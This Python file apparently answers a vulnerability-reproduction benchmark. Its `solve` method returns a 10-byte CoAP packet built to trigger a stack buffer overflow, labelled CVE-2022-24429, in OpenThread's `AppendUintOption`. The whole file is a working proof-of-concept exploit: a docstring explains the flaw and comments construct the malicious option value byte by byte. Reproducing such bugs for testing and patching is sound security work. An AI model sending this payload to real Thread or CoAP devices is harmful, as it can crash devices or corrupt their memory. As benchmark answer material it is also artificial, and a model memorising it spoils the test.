import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) for CVE-2022-24429, a stack buffer
        overflow in OpenThread's CoAP `AppendUintOption` function.

        The vulnerability occurs because the function uses a 4-byte stack buffer to
        encode a `uint64_t` value. When a value greater than 2^32 - 1 is processed,
        the encoding requires 5 to 8 bytes, overflowing the buffer.

        This PoC is a 10-byte CoAP message designed to trigger this overflow. It
        contains a single CoAP option (Content-Format, #12) with a 5-byte value
        representing 2^32. When a vulnerable device parses and re-encodes this
        option, the overflow is triggered.
        """

        # CoAP Header (4 bytes):
        # Version: 1, Type: Confirmable (0), Token Length: 0
        # Code: GET (0.01)
        # Message ID: 0x0000 (arbitrary)
        # First byte: 0b01000000 = 0x40
        header = b'\x40\x01\x00\x00'

        # CoAP Option Header (1 byte):
        # Option Delta: 12 (for Content-Format, option #12)
        # Option Length: 5 bytes
        # Byte: (12 << 4) | 5 = 0xC5
        option_header = b'\xc5'

        # CoAP Option Value (5 bytes):
        # The value 2^32 (0x100000000) is the smallest integer that requires
        # more than 4 bytes, thus triggering the 64-bit encoding path in the
        # vulnerable function.
        option_value = (2**32).to_bytes(5, 'big')

        # The full PoC is the concatenation of the header and the malicious option.
        # Total length: 4 + 1 + 5 = 10 bytes.
        poc = header + option_header + option_value
        return poc